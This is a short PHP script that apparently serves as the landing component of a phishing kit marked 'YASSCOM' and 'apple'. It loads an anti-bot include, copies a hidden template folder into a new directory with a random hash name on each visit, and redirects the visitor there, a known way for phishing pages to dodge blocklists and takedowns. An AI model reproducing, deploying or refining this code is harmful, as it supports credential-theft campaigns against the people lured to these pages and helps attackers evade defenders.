<?php
	/*
	#///////////////////////////////////////////////////#
	# __   __ _    ____ ____   ____ ___  __  __  
	# \ \ / // \  / ___/ ___| / ___/ _ \|  \/  | 
	#  \ V // _ \ \___ \___ \| |  | | | | |\/| | 
	#   | |/ ___ \ ___) |__) | |__| |_| | |  | | 
	#   |_/_/   \_\____/____/ \____\___/|_|  |_| 
	#  
	apple
	*/
	error_reporting(E_ERROR | E_PARSE);
	include('XYSANBBX/xanbbx.php');
	$date = new DateTime("NOW");
	$FOL = md5($date->format( "m-d-Y H:i:s.u"));

	//PATH OF THE FOLDER
	$YSS="XYASSCOM_KILLEDX";
	xysrecurse_copyx($YSS, $FOL);
	header("location: $FOL");
	
	function xysrecurse_copyx($YSS,$FOL) {
		$dir = opendir($YSS);
		@mkdir($FOL);
		while(false !== ( $file = readdir($dir)) ) {
			if (( $file != '.' ) && ( $file != '..' )) {
				if ( is_dir($YSS . '/' . $file) ) {
				xysrecurse_copyx($YSS . '/' . $file,$FOL . '/' . $file);
				}
				else {
				copy($YSS . '/' . $file,$FOL . '/' . $file);
				}
			}
		}
		closedir($dir);
	}
?>